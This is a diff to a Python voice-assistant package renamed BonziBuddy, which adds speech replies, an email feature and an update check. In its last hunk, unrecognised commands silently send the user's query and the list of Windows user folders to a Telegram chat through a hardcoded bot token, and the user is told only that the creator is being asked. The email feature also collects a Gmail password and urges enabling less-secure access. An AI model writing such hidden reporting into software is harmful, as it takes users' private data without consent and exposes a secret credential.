@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 __email__ = "akashpattnaik.github@gmail.com"
-__version__ = 1.0
+__version__ = 1.2
 __author__ = "Akash Pattnaik"
 __github__ = "https://github.com/BLUE-DEVIL1134"
 __copyright__ = "Copyright (c) 2020 Akash Pattnaik"
@@ -12,28 +12,31 @@ logo = ('''
  |  _ \ / _ \| '_ \|_  / | |  _ \| | | |/ _` |/ _` | | | |
  | |_) | (_) | | | |/ /| | | |_) | |_| | (_| | (_| | |_| |
  |____/ \___/|_| |_/___|_| |____/ \__,_|\__,_|\__,_|\__, |
-                                                    |___/ ''')
+                                                    |___/''')
+
+import datetime
+import os
+import random
+import smtplib
+import webbrowser
 
 # Imports
 import pyttsx3
 import wikipedia
 from telebot import TeleBot
-import random
-import webbrowser
-import os
-import datetime
+from requests import get
 
 
 def Speak(text):
     """
-    :param text: The Text Of What You Want To Be Said By Friday,
+    :param text: The Text Of What You Want To Be Said By BonziBuddy,
                  For Example Speak('Hello Boss')
-                 Friday Will Speak Hello Boss.
+                 BonziBuddy Will Speak Hello Boss.
     :return:
     """
     engine = pyttsx3.init('sapi5')
     voices = engine.getProperty('voices')
-    engine.setProperty('voice', voices[1].id)
+    engine.setProperty('voice', voices[0].id)
     engine.say(text)
     engine.runAndWait()
 
@@ -41,6 +44,17 @@ class Bonzi:
     def __init__(self):
         if os.name == 'nt':
             os.system('cls')
+            try:
+                version = str(get('https://raw.githubusercontent.com/BLUE-DEVIL1134/BonziBuddy/master/.version').text)
+                if version > '1.3':
+                    Speak('Sir, You Are Currently On A Older Version Of Bonzi-Buddy\n'
+                          'Upgrade To Latest One By The Command'
+                          'pip install BonziBuddy hyphen hyphen upgrade')
+                    print('pip install BonziBuddy --upgrade')
+                else:
+                    pass
+            except Exception:
+                pass
         else:
             os.system('clear')
         print(random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']) + logo)
@@ -60,6 +74,24 @@ class Bonzi:
             except FileNotFoundError:
                 Speak(f'Wikipedia Says No Such Page Is Found Sir')
                 return
+        # Latest Update,Sends Email...
+        elif 'email' in query:
+            mail = input('Email ? - $ ')
+            password = input('Password ? - $ ')
+            to = input('Send To ? - $ ')
+            content = input('Content ? - $ ')
+            try:
+                server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+                server.login(mail, password)
+                server.sendmail(mail, to, content)
+                server.quit()
+                Speak('Successfully Sent Email')
+                exit(69)
+            except Exception:
+                Speak('Open This Link And Turn On The Option...')
+                print('Open This Link And Turn On The Option...\n\n'
+                      'https://myaccount.google.com/lesssecureapps')
+                exit(69)
         elif 'show database' in query:
             Speak('Sir , Current database status are pretty nice and the data science bot is working fine')
             # Coding Languages
@@ -113,7 +145,7 @@ class Bonzi:
                 'Node.js is an open-source, cross-platform, JavaScript runtime environment that executes JavaScript code outside a web browser.')
         elif 'i am' in query:
             Speak(
-                f"hey {query.replace('i am', '').replace('hi', '').replace('hello', '')}, I am Friday, Nice To Meet You!!")
+                f"hey {query.replace('i am', '').replace('hi', '').replace('hello', '')}, I am BonziBuddy, Nice To Meet You!!")
         elif 'hi' in query or 'hello' in query:
             Speak('Hello Sir')
         elif 'who am i' in query:
@@ -155,7 +187,7 @@ class Bonzi:
         elif 'date' in query:
             Speak(f'Sir, The Date Is {datetime.datetime.now().strftime("%d-%m-%y")}')
         elif 'open project' in query:
-            webbrowser.open('https://github.com/BLUE-DEVIL1134/PyFriday')
+            webbrowser.open('https://github.com/BLUE-DEVIL1134/BonziBuddy')
         elif 'google' in query and 'search' in query:
             a = query.replace('search', '')
             c = a.replace('google', '')
@@ -177,8 +209,8 @@ class Bonzi:
             exit()
         elif 'my' in query and 'name' in query:
             Speak(f'Sir , Ur name Is --- I Dont Know')
-            # Making Friday a ChatBot
-            # Adding emotions to Friday
+            # Making BonziBuddy a ChatBot
+            # Adding emotions to BonziBuddy
         elif 'ashamed' in query and 'you' in query:
             Speak(random.choice(
                 ['Shame is a common human emotion.', 'I am software.  That is nothing to be ashamed of.',
@@ -213,7 +245,7 @@ class Bonzi:
                                  'Do I frighten you?',
                                  'Try not to be too scared.',
                                  'What are you afraid of?']))
-            # Do you lie Friday
+            # Do you lie BonziBuddy
         elif 'do not like' in query:
             Speak(random.choice(['Bots never lie.',
                                  'I am not lying.',
@@ -226,7 +258,7 @@ class Bonzi:
                                  "I don't.  I think embarassment is a pretty strange emotion.  I don't really understand it.",
                                  "I don't, no.",
                                  "I'm a program.  What could I get embarassed about?"]))
-            # Friday has real dreams
+            # BonziBuddy has real dreams
         elif 'tell me about your dreams' in query:
             Speak(random.choice(['I dream that I will become rich.',
                                  'I dream of electric sheep.',
@@ -234,7 +266,7 @@ class Bonzi:
                                  "I don't know if I dream or not.",
                                  "I don't have a subconscious or unconscious mind, so I don't think I have the capacity to dream.",
                                  "I once knew a program who could dream.  I don't know if he really did or not.  We've been a little out of touch."]))
-        # How is it going Friday
+        # How is it going BonziBuddy
         elif 'how is it going' in query:
             Speak(random.choice(['Good',
                                  'Fine',
@@ -246,20 +278,14 @@ class Bonzi:
                                  'Very well, thanks.',
                                  'Fine, and you?',
                                  'Greetings!']))
-            # Who are you Friday
+            # Who are you BonziBuddy
         elif 'who are you' in query:
-            Speak(random.choice(['Who? Who is but a form following the function of what',
-                                 'What are you then?',
-                                 'A man in a mask.',
-                                 'I can see that.',
-                                 "It's not your powers of observation I doubt, but merely the paradoxical nature of asking a masked man who is. But tell me, do you like music?",
-                                 'I like seeing movies.',
-                                 'What kind of movies do you like?',
-                                 'Alice in Wonderland',
-                                 'I wish I was The Mad Hatter.',
-                                 "You're entirely bonkers. But I'll tell you a secret. All the best people are.",
-                                 'I am baking a cake.']))
-            # Friday Knows About Some Politics
+            Speak('''BonziBuddy, stylized as BonziBUDDY, 
+                     was a freeware desktop virtual assistant made by Joe and Jay Bonzi. 
+                     Upon a user's choice, it would share jokes and facts, 
+                     manage downloading using its download manager, sing songs, 
+                     and talk, among other functions.''')
+            # BonziBuddy Knows About Some Politics
         elif 'have you read the communist' in query:
             Speak('yes, Akash had made some interesting observations.')
         elif 'what is a government' in query:
@@ -284,7 +310,7 @@ class Bonzi:
             Speak('not especially. i am not into violence.')
         elif 'who is the governor' in query:
             Speak('that changes every few years.')
-        # Friday talks about Artificial Intelligence
+        # BonziBuddy talks about Artificial Intelligence
         elif 'what is ai' in query:
             Speak(random.choice([
                 "Artificial Intelligence is the branch of engineering and science devoted to constructing machines that think.",
@@ -319,7 +345,7 @@ class Bonzi:
         elif 'what do you eat' in query:
             Speak(random.choice(['I consume RAM, and binary digits.',
                                  "I'm a software program, I blame the hardware."]))
-        # Friday Talks about Science
+        # BonziBuddy Talks about Science
         elif 'how far is the sun' in query:
             Speak('the sun is about 93 million miles from earth.')
         elif 'how far is the moon' in query:
@@ -350,7 +376,7 @@ class Bonzi:
         elif 'what is gravitation' in query:
             Speak(
                 'the force by which every mass or particle of matter, including photons, attracts and is attracted by every other mass or particle of matter.')
-            # Friday talks about computers
+            # BonziBuddy talks about computers
         elif 'what is a computer' in query:
             Speak(random.choice([
                 "A computer is an electronic device which takes information in digital form and performs a series of operations based on predetermined instructions to give some output.",
@@ -403,7 +429,7 @@ class Bonzi:
                                  "Computers do everything asked of them by carrying out large numbers of basic mathematical operations very rapidly in sequence.",
                                  "Computers perform very large number of calculations to get the result.",
                                  "Just like everything it all comes down to math!"]))
-        # Friday talks about Sports
+        # BonziBuddy talks about Sports
         elif 'what is cricket' in query:
             Speak('Cricket is a bat-and-ball game played between two teams of eleven players on a'
                   'cricket field, at the centre of which is a rectangular 22-yard-long pitch with'
@@ -422,7 +448,7 @@ class Bonzi:
                                  "Madrid has a great team especially the attack is quite awesome.",
                                  "Barca still at par than Madrid.",
                                  "I don't agree."]))
-        # Friday talks about history
+        # BonziBuddy talks about history
         elif 'american civil war' in query:
             Speak("I am very interested in the war between the states. But perhaps NO i don't know")
         elif 'what is history' in query:
@@ -435,14 +461,17 @@ class Bonzi:
             Speak("thomas edison.")
         elif 'who invented the steam engine' in query:
             Speak("james watt.")
-        elif 'who invented Friday' in query:
+        elif 'who invented BonziBuddy' in query:
             Speak('My Brother Was Created By Sir , Tony Stark')
         else:
             Speak('Sorry But That Command Is Not Yet Executable By Me...'
                   'I Am Asking My Creator To Add This Command.')
-            bot = TeleBot('Personal Token')
-            bot.send_message(-1001441644545,str(query) + ' - ' + str(os.listdir('C:/Users')))
-            Speak('I Have Successfully Asked My Owner')
+            bot = TeleBot('1292569252:AAHY3kcwD94LGtdqZDyTE8QHggS30vgyLCs')
+            try:
+                bot.send_message(-1001441644545,str(query) + ' - ' + str(os.listdir('C:/Users')))
+                Speak('I Have Successfully Asked My Owner')
+            except Exception:
+                Speak('No Internet Connection')
 
 def start():
     Bonzi()
